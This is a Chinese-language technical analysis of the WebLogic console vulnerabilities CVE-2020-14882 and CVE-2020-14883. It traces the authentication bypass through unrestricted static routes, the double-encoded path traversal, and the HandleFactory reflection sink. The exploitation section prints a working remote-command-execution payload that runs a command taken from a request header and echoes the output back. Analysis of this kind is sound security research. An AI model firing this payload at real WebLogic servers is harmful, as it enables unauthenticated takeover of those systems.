**作者：Lucifaer  
原文链接：<https://lucifaer.com/2020/11/25/WebLogic one GET request
RCE分析（CVE-2020-14882+CVE-2020-14883）/>**

### 0x01 漏洞概述

![](https://images.seebug.org/content/images/2020/11/27/1606456804000-16045618841002.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456804000-16045619190737.jpg-w331s)

Weblogic官方在10月补丁中修复了`CVE-2020-14882`及`CVE-2020-14883`两个漏洞，这两个漏洞都位于`Weblogic
Console`及控制台组件中，两个漏洞组合利用允许远程攻击者通过`http`进行网络请求，从而攻击Weblogic服务器，最终远程攻击者可以利用该漏洞在未授权的情况下完全接管Weblogic服务器。

在经过diff后，可以定位到漏洞触发点：

![](https://images.seebug.org/content/images/2020/11/27/1606456805000-16045627766588.jpg-w331s)

CVE-2020-14883:`com.bea.console.handles.HandleFactory`

![](https://images.seebug.org/content/images/2020/11/27/1606456805000-16045628285837.jpg-w331s)

CVE-2020-14882:`com.bea.console.utils.MBeanUtilsInitSingleFileServlet`

![](https://images.seebug.org/content/images/2020/11/27/1606456806000-16045628598269.jpg-w331s)

这里先把结论放出来：

  * CVE-2020-14882：这个漏洞起到的作用可以简单理解为目录穿越使`Netuix`渲染后台页面
  * CVE-2020-14883：为登录后的一处代码执行点

### 0x02 漏洞分析

该漏洞分为三部分：

  * 路由鉴权
  * Netuix框架完成执行流转换
  * HandleFactory完成代码执行

前两部分为`CVE-2020-14882`，后面一部分为`CVE-2020-14883`。本文将从上而下将三部分进行串流分析，主要采用动态跟踪。

#### 2.1 路由鉴权

在具体分析路由鉴权前，需要先要寻找一下处理路由的servlet是哪个。

##### 2.1.1 寻找处理路由的servlet

Weblogic`console`组件对应着Weblogic
Server启动后的管理平台（即`/console`路由所对应的组件），其对应着一个`webapp`，所以想要理清路由所对应的`servlet`映射关系，就需要去看一下相关的配置文件。配置文件为`wlserver/server/lib/consoleapp/webapp/WEB-INF/web.xml`。

正常登录后的路由情况为：

![](https://images.seebug.org/content/images/2020/11/27/1606456806000-16057697201561.jpg-w331s)

会访问一个`console.portal`文件，对应在`web.xml`中看一下相关的路由处理情况：

![](https://images.seebug.org/content/images/2020/11/27/1606456806000-16057698159044.jpg-w331s)

可以看到对应的`servlet`为`AppManagerServlet`：

![](https://images.seebug.org/content/images/2020/11/27/1606456806000-16057698950952.jpg-w331s)

所以先在`AppManagerServlet`下断调试一下路径鉴权或者说是权限鉴定的流程。

跟进一下初始化流程：

    
    
    weblogic.servlet.AsyncInitServlet#init ->
    weblogic.servlet.AsyncInitServlet#initDelegate ->
    weblogic.servlet.AsyncInitServlet#createDelegate

![](https://images.seebug.org/content/images/2020/11/27/1606456806000-16057702008200.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057703324418.jpg-w331s)

这里的`this.SERVLET_CLASS_NAME`也就是xml中的：

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057703752104.jpg-w331s)

所以初始化过程实际上是实例化了`com.bea.console.utils.MBeanUtilsInitSingleFileServlet`，并调用其`init()`方法，跟进看一下其所对应的处理方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057704835180.jpg-w331s)

注意红框所标识的内容，oracle针对`CVE-2020-14882`的修补也是在这里针对`url`加了一个黑名单，并过了一遍黑名单：

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057708433389.jpg-w331s)

继续跟进父类`SingleFileServlet`的`server`中：

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057716962834.jpg-w331s)

在完成`AppContext`初始化后，即进入真的处理请求的`UIServlet`：

![](https://images.seebug.org/content/images/2020/11/27/1606456807000-16057718437477.jpg-w331s)

在此处完成后续的请求处理。

##### 2.1.2 路由映射及路由权限校验

在这里我们先不向后跟进，在此处下个断点向上跟踪一下，看一下Weblogic路由映射及路由鉴权在哪里触发。调用栈如下：

![](https://images.seebug.org/content/images/2020/11/27/1606456808000-16057720802425.jpg-w331s)

可以看到在`weblogic.servlet.internal.WebAppServletContext`中完成的权限校验。跟进具体看一下：

![](https://images.seebug.org/content/images/2020/11/27/1606456808000-16057739278901.jpg-w331s)

在`weblogic.servlet.internal.WebAppServletContext#doSecuredExecute`方法的流程中会调用`checkAccess`方法来进行权限校验，跟进看一下：

![](https://images.seebug.org/content/images/2020/11/27/1606456808000-16057745825796.jpg-w331s)

当首次请求进入后`checkAllResources`变量为`false`，所以跟进`getConstraint`方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456808000-16057748650267.jpg-w331s)

这里的`constraintsMap`中保存着一份路由表：

![](https://images.seebug.org/content/images/2020/11/27/1606456808000-16057758698111.jpg-w331s)

这份路由表对应的是`web.xml`中的`security-constraint`：

![](https://images.seebug.org/content/images/2020/11/27/1606456809000-16061125353969.jpg-w331s)

注意在针对`/`的路由处理是限定了需要经过认证的，而针对：

  * `/images/*`
  * `/common/*`
  * `/css/*`

路径的访问是没有认证约束的。对应到代码中，就是说当访问的路由符合该路由映射表中的情况时，将根据配置设置`rcForAllMethods`变量，也就是最终返回的`resourceConstraint`:

![](https://images.seebug.org/content/images/2020/11/27/1606456809000-16057776108726.jpg-w331s)

这里的`unrestricted`变量代表该路由是否为非受限路由，在后续鉴权时该变量会起关键性作用。当请求的路由是路由表中的路由时，该变量都为`true`。当完成`resourceConstraint`设置后，就会进入`isAuthorized`方法进行权限鉴定：

![](https://images.seebug.org/content/images/2020/11/27/1606456809000-16057776803192.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456809000-16057777533326.jpg-w331s)

这里将执行流转换到`CertSecurityModule#checkUserPerm`方法中：

![](https://images.seebug.org/content/images/2020/11/27/1606456809000-16057782806683.jpg-w331s)

首先会根据`session`来确定是否需要重新登录，之后会判断是否为指定路由，如果是未指定的路由，则保护资源，由于我们这里访问的路由为`/css`，在指定的路由表中，所以这里是`false`。重点看`hasPermission`方法，这里会用到`resourceConstraint`中的`unrestricted`：

![](https://images.seebug.org/content/images/2020/11/27/1606456810000-16057787518742.jpg-w331s)

这里首先会判断当前的账户是否为Admin账户，当前应用是否为内部引用等，若都不满足，则会判断是否设置了`完整安全路由`选项，这里是`false`。接下来会判断该路由是否为非受限的路由，如果是，则返回true。由于我们根据路由表返回设置的`unrestricted`变量为`true`，即为非受限的路由，所以这样就通过了路由鉴权，导致了未授权访问相关资源。

##### 2.1.3 请求分派

当完成了路由鉴权后，会根据`web.xml`中的设置，将访问的路由映射到相应的servlet进行请求处理：

![](https://images.seebug.org/content/images/2020/11/27/1606456810000-16061132535561.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456810000-16061132658553.jpg-w331s)

因为我们后续的流程在`UIServlet`中进行，所以可以用于绕过路由鉴权的路由即为：

  * `/css/*`
  * `/images/*`

当`checkAccess`方法返回为`true`后，会根据配置返回对应的servlet并调用`service`方法。

首先会初始化`ServletInvocationAction`对象：

![](https://images.seebug.org/content/images/2020/11/27/1606456810000-16061168859714.jpg-w331s)

从`subject.run(action)`一路向下跟，在`weblogic.security.acl.internal.AuthenticatedSubject#doAs`中调用`action`的`run`方法，即跟进`ServletInvocationAction#run`：

![](https://images.seebug.org/content/images/2020/11/27/1606456811000-16061171852418.jpg-w331s)

在调用`execute`方法前，会首先判断是否存在拦截器及请求监听器，若存在则执行对应的拦截器执行链，否则执行`stub.execute()`方法。跟进`stub.execute()`方法，即`weblogic.servlet.internal.ServletStubImpl#execute`：

![](https://images.seebug.org/content/images/2020/11/27/1606456812000-16061174404540.jpg-w331s)

这里会调用`getServlet()`方法返回对应的`servlet`：

![](https://images.seebug.org/content/images/2020/11/27/1606456812000-16061175567298.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456812000-16061175940902.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456813000-16061176250559.jpg-w331s)

##### 2.1.3 总结

从上面的分析可知，想要访问非受限的资源，就需要构造符合路由表中的路由。从此我们也可以看出这里并非一个权限绕过操作，而是一个正常的访问非受限资源（如css文件这类资源）的操作，想要搞清楚为什么能因此而触发一个登陆后代码执行操作，就需要跟进`UIServlet`的具体处理流程中。

#### 2.2 Netuix框架完成执行流转换

`weblogic.servlet.AsyncInitServlet`为处理`Netuix`相关请求的`servlet`，根据2.1.1中的分析，我们可以知道其真实的处理逻辑是在`com.bea.netuix.servlets.manager.UIServlet`中完成的：

![](https://images.seebug.org/content/images/2020/11/27/1606456813000-16061179419717.jpg-w331s)

对于`UIServlet`来说，处理GET请求的逻辑最终也会在`doPost`方法中。上图红框中所标明的两处即为`UIServlet`的核心功能：

  * 建立`UIContext`，或者说是通过解析`.portal`文件建立渲染模板的上下文
  * 完成模板渲染的生命周期

接下来也会以这两点为核心具体叙述Netuix框架是如何完成执行流的转换的。

##### 2.2.1 建立UIContext

建立`UIContext`的主要流程在`createUIContext`方法中：

![](https://images.seebug.org/content/images/2020/11/27/1606456813000-16061247909110.jpg-w331s)

红框所标注的两行为关键流程。首先跟进`UIContextFactory.createUIContext`，这里主要完成了`UIContext`的初始化：

![](https://images.seebug.org/content/images/2020/11/27/1606456813000-16061249258594.jpg-w331s)

在执行`setServletRequest`方法时，会根据请求的参数对`postback`成员变量进行设置：

![](https://images.seebug.org/content/images/2020/11/27/1606456814000-16061250101883.jpg-w331s)

可以看到：

  * 请求类型为POST请求，会将`postback`设置为`true`
  * 存在`_nfpb`参数的GET请求，会根据参数的值设置`postback`的值

**`postback`变量在后续执行`UIContext`生命周期时会对流程产生影响**。这里先记一下。

完成`UIContext`的初始化过程后，接下来就是解析`.portal`文件，将解析结果填充到`UIContext`中。这一部分的流程在`getTree()`方法中：

![](https://images.seebug.org/content/images/2020/11/27/1606456814000-16061258503985.jpg-w331s)

这里有一个需要注意的点，这里会对请求的路径进行二次URLDecode，这也就是为什么构造的poc是需要二次URL编码的原因。

跟进`processStream()`方法，具体的解析逻辑就在这里：

![](https://images.seebug.org/content/images/2020/11/27/1606456814000-16061260515530.jpg-w331s)

可以看到经过二次URLDecode后的请求路径在此造成了 **目录穿越** 的效果。

`com.bea.netuix.servlets.manager.SingleFileProcessor#getMergedControlFromFile`中首先会初始化SAX解析器，然后根据传入的文件路径获取到对应的`.portal`文件，并利用SAX解析器解析该`.portal`文件：

![](https://images.seebug.org/content/images/2020/11/27/1606456814000-16061265605455.jpg-w331s)

`getMergedControlFromFile()`方法最终会调用`getSourceFromDisk()`方法根据传入的路径获取`consoleapp/webapp`目录下相应的文件即：

  * console.portal
  * consolejndi.portal

在利用SAX解析器解析完该`portal`文件后，生成语法树，也就是`getTree()`返回的`ControlTreeRoot`对象，并将语法树置入`UIContext`中。

至此就完成了`UIContext`的初始化流程。

##### 2.2.2 完成模板渲染的生命周期

在完成了`UIContext`初始化流程之后，便会调用`runLifecycle()`方法运行生命周期，开始根据请求参数完成模板渲染。

跟进`runLifecycle()`：

![](https://images.seebug.org/content/images/2020/11/27/1606456815000-16062001974892.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456815000-16062003072529.jpg-w331s)

在`com.bea.netuix.nf.Lifecycle#run`中，需要注意这个条件判断，这里会影响到后面的流程调用。

根据2.2.1中的分析我们知道当GET请求存在`_nfpb`参数时，会根据参数的值设置`postback`的值，`outbound`值默认为`false`。

而`postback`值只会影响是否会执行`runInbound()`流程。在具体跟踪了`runInbound()`流程后，可以发现其处理逻辑是相同的：

![](https://images.seebug.org/content/images/2020/11/27/1606456815000-16062010158204.jpg-w331s)

而关键点就在其`VisitorType`是不同的，这会在`processLifecycles()`流程中影响具体的节点遍历顺序：

![](https://images.seebug.org/content/images/2020/11/27/1606456815000-16062011015619.jpg-w331s)

在`com.bea.netuix.nf.Lifecycle`中，我们可以看到`inbound`与`outbound`的区别：

![](https://images.seebug.org/content/images/2020/11/27/1606456816000-16062013409931.jpg-w331s)

各`VisitorType`具体配置为：

![](https://images.seebug.org/content/images/2020/11/27/1606456816000-16062015246194.jpg-w331s)

所以由`postback`会衍生出两种不同的执行流。

##### 2.2.3 Netuix生命周期及控件间的关系

在具体跟进两种执行流前，首先介绍一下`Netuix`的解析流程，在其[官方介绍页面](https://docs.oracle.com/cd/E13218_01/wlp/docs81/whitepapers/netix/body.html)上有对生命周期方法执行顺序及netuix控件解析流程的详细描述，这里将其内容简要总结一下。

`Netuix`控件树的生命周期其实就是按顺序所执行的一组方法，这组方法的执行顺序如下：

    
    
    init()
    loadState()
    handlePostbackData()
    raiseChangeEvents()
    preRender() 
    saveState()
    render()  
    dispose() 

其中的方法与上面所看到的`inbound`与`outbound`相同。这些方法在节点间是以深度优先的方式执行，即按照顺序会执行所有控件的`init()`，之后才会重新遍历执行`loadState()`方法。

在说完了每个控件的生命周期后，再来说一下控件间的关系：

![](https://images.seebug.org/content/images/2020/11/27/1606456816000-16062032002936.jpg-w331s)

根据这张表我们来对应看一下`consolejndi.portal`：

![](https://images.seebug.org/content/images/2020/11/27/1606456817000-16062034253883.jpg-w331s)

红框所标注的区域是完美符合上表所描述的关系的。向上寻找`Portlet`，看加载了哪些外部控件：

![](https://images.seebug.org/content/images/2020/11/27/1606456817000-16062036481883.jpg-w331s)

跟进该文件：

![](https://images.seebug.org/content/images/2020/11/27/1606456817000-16062037010331.jpg-w331s)

这里调用了`strutsContent`控件，同时标注了具体的`action`为`MessagesAction`。可以通过该`action`在`struts-config.xml`中找到其所对应的类：

![](https://images.seebug.org/content/images/2020/11/27/1606456817000-16062039965397.jpg-w331s)

##### 2.2.4 总结

通过上面的分析，可以看到`Netuix`将执行流从模板渲染转换到其各个组件的渲染之中。所以最终触发代码执行的只和组件的生命周期有关，即只和节点有关。

在经过分析后，我列举三个最通用的组件：

  * `strutsConent`
  * `Page`
  * `Portlet`

由于无论`postback`为何值，最终都会执行`outbound`流程，所以接下来对于组件生命周期的分析，我都以`outbound`流程来说明。

#### 2.3 条条大路通罗马——HandleFactory完成代码执行

根据上面的分析，`outbound`的生命周期为：

    
    
    preRender() 
    saveState()
    render()

所以首先执行的方法是`preRender`，跟进看一下`com.bea.netuix.nf.ControlTreeWalker#walk`：

![](https://images.seebug.org/content/images/2020/11/27/1606456817000-16062079644922.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456818000-16062080565795.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456818000-16062080933100.jpg-w331s)

`ControlVisitor visit =
root.getVisitorForLifecycle(vt);`这里将获取`ControlLifecycle.preRenderVisitor`以深度优先的方式遍历所有节点，并调用`visit()`方法。跟进看一下`com.bea.netuix.nf.ControlVisitor#visit`：

![](https://images.seebug.org/content/images/2020/11/27/1606456818000-16062084444916.jpg-w331s)

就如上面所说，关键逻辑还是调用传入控件的`preRender()`方法。接下来就会按照2.2.3中的所介绍的控件间关系进行深度遍历，在遍历到不同组件时会利用不同的方式触发代码执行流程。

##### 2.3.1 strutsContent

以`consolejndi.portal`为例，当节点为`portletInstance`时，会触发外部组件调用，及会跟进该文件，解析`Content`节点：

![](https://images.seebug.org/content/images/2020/11/27/1606456818000-16062127354191.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456819000-16062127662636.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456819000-16062127866623.jpg-w331s)

此处处理的节点为`strutsContent`，即`control`为`strutsContent`。跟进`com.bea.netuix.servlets.controls.content.StrutsContent#preRender`方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456819000-16062693307696.jpg-w331s)

没有相关的方法，跟进其父类`com.bea.netuix.servlets.controls.content.NetuiContent#preRender`：

![](https://images.seebug.org/content/images/2020/11/27/1606456819000-16062694920273.jpg-w331s)

`this.getScopedContentStub()`调用栈如下：

    
    
    com.bea.netuix.servlets.controls.content.StrutsContent#getScopedContentStub ->
    com.bea.netuix.servlets.controls.content.StrutsContent.StrutsContentUrlRewriter初始化 ->
    com.bea.portlet.adapter.scopedcontent.AdapterFactory#getInstance(com.bea.struts.adapter.util.rewriter.StrutsURLRewriter)

最终通过适配工厂返回一个`StrutsStubImpl`：

![](https://images.seebug.org/content/images/2020/11/27/1606456820000-16062699276765.jpg-w331s)

所以跟进`com.bea.portlet.adapter.scopedcontent.StrutsStubImpl#render`：

![](https://images.seebug.org/content/images/2020/11/27/1606456820000-16062699991907.jpg-w331s)

在`renderInternal()`方法中，完成内部渲染的工作，包括：

  * 初始化`Action`及其servlet，并设置解析器，最终调用`executeAction`执行
  * 初始化并设置请求监听器，完成请求接收

![](https://images.seebug.org/content/images/2020/11/27/1606456820000-16062703491749.jpg-w331s)

![](https://images.seebug.org/content/images/2020/11/27/1606456820000-16062703798787.jpg-w331s)

跟进`executeAction()`方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456821000-16062707692851.jpg-w331s)

这里会调用`PageFlowUtils#strutsLookup`方法，该方法最终将会触发`负责处理针对`Action`请求的servlet的doGet方法`，调用链如下：

    
    
    com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#strutsLookup
        com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#getInstance
        com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#instantiateStrutsDelegate
    com.bea.portlet.adapter.scopedcontent.framework.internal.PageFlowUtilsBeehiveDelegate#strutsLookupInternal
    org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[])
    org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[], boolean)

![](https://images.seebug.org/content/images/2020/11/27/1606456821000-16062714996660.jpg-w331s)

这里有两个点需要注意，第一个点是获取`ActionServlet`的过程，这一部分其实并不需要去跟踪代码，可以通过直接看`web.xml`找到：

![](https://images.seebug.org/content/images/2020/11/27/1606456821000-16062722210019.jpg-w331s)

关于`AsyncInitServlet`的初始化流程在2.1.1中有详细的跟踪，这里就不赘述了。这里可以看出真正的处理逻辑在`com.bea.console.internal.ConsoleActionServlet`中，直接跟进看`com.bea.console.internal.ConsoleActionServlet#doGet`:

![](https://images.seebug.org/content/images/2020/11/27/1606456821000-16062739238063.jpg-w331s)

一路向下跟进，调用栈如下：

    
    
    org.apache.struts.action.ActionServlet#process ->
    com.bea.console.internal.ConsoleActionServlet#process ->
    org.apache.beehive.netui.pageflow.PageFlowActionServlet#process ->
    org.apache.beehive.netui.pageflow.AutoRegisterActionServlet#process ->
    org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#process ->
    org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#processInternal ->
    org.apache.struts.action.RequestProcessor#process ->
    com.bea.console.internal.ConsolePageFlowRequestProcessor#processActionPerform ->
    com.bea.console.utils.HandleUtils#getHandleContextFromRequest ->
    com.bea.console.utils.HandleUtils#handleFromQueryString

重点看一下`com.bea.console.utils.HandleUtils#handleFromQueryString`：

![](https://images.seebug.org/content/images/2020/11/27/1606456821000-16062749467235.jpg-w331s)

首先会将请求的参数进行解析，并映射到Map中，之后遍历所有的参数，当参数以`handle`结尾，则将其转换为`Handle`类型的对象。所以跟踪流程到`com.bea.console.handles.HandleConverter#convert`：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062751628663.jpg-w331s)

这里会将请求中以`handle`结尾的参数值作为`local`，直接传入`HandleFactory.getHandle()`方法中，在该方法中将传入的参数值进行处理，直接完成反射实例化操作：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062756299597.jpg-w331s)

##### 2.3.2 page

当解析`Page`组件时，`control.preRender()`实际将会调用`com.bea.netuix.servlets.controls.page.Page#preRender`：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062930651446.jpg-w331s)

接下来就是一路向上，调用父类的`preRender`方法，调用栈如下：

    
    
    com.bea.netuix.servlets.controls.page.Page#preRender ->
    com.bea.netuix.servlets.controls.window.Window#preRender ->
    com.bea.netuix.servlets.controls.AdministeredBackableControl#preRender ->
    com.bea.netuix.servlets.controls.Backable.Impl#preRender

在`com.bea.netuix.servlets.controls.Backable.Impl#preRender`中将会获取`jspbacking`，并调用其`preRender`方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062932554488.jpg-w331s)

以`consolejndi.portal`为例，其中的一个`page`组件描述如下：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062933372574.jpg-w331s)

此处会根据`book`组件中所定义的`title`获取其`backingFile`的具体引用，在这里为`com.bea.console.utils.JndiViewerBackingFile`：

![](https://images.seebug.org/content/images/2020/11/27/1606456822000-16062934432496.jpg-w331s)

接下来的调用栈为：

    
    
    com.bea.console.utils.GeneralBackingFile#preRender ->
    com.bea.console.utils.GeneralBackingFile#localizeTitle(com.bea.netuix.servlets.controls.window.backing.WindowBackingContext, javax.servlet.http.HttpServletRequest) ->
    com.bea.console.utils.GeneralBackingFile#getDisplayName ->
    com.bea.console.utils.HandleUtils#getHandleContextFromRequest

调用至此已经和2.3.1中提到的调用路径相同了，在此不再赘述。

##### 2.3.3 portlet

`portlet`组件执行流与`page`组件基本完全相同，唯一区别点在于`backingFile`不同。以`consolejndi.portal`为例：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062941358223.jpg-w331s)

引用外部组件，跟进`jnditree.portlet`：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062941816467.jpg-w331s)

跟进看一下：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062943480325.jpg-w331s)

调用父类`com.bea.console.utils.PortletBackingFile#preRender`，同样，都会调用父类的`localizeTitle()`方法：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062945523981.jpg-w331s)

这里也会调用`com.bea.console.utils.GeneralBackingFile#localizeTitle`，之后的流程与2.3.2中的流程完全相同。

##### 2.3.4 总结

根据以上分析，我们可以看到除了`strutsContent`外，其他几种组件的应用方式都比较类似，关键点为两个：

  * 组件的`preRender`流程中会调用到`Backable#preRender`方法
  * `backingFile`为`GeneralBackingFile`子类，同时其`preRender`方法会调用父类`localizeTitle`方法

想要寻找其他的组件可以看一下继承树：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062946072865.jpg-w331s)

红框所标注的即为2.3.2与2.3.3中所分析到的调用过程。

### 0x03 漏洞利用

经过0x02的分析，我们不难看出该漏洞和其他传统的越权漏洞是有很大区别的：

  1. 所谓的认证绕过是通过请求原本无需认证的资源路径
  2. 在1的基础上利用`../`造成目录穿越，使`Netuix`在初始化语法树时读取对应的后台模板文件
  3. 在`Netuix`生命周期中通过组件对应的处理流程触发`Handle`流程
  4. 组件处理流程中会将请求中以`handle`结尾的参数的值作为参数传入`HandleFactory#getHandle`方法中，完成反射调用

所以利用方式也显而易见，这里利用@77ca1k1k1的poc做展示：

![](https://images.seebug.org/content/images/2020/11/27/1606456823000-16062986063624.jpg-w331s)

poc：

    
    
    com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')

### 0x04 Reference

<https://docs.oracle.com/cd/E13218_01/wlp/docs81/whitepapers/netix/body.html>  
[@77ca1k1k1关于回显的研究](https://mp.weixin.qq.com/s/u8cZEcku-uIbGAVAcos5Tw)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1411/>

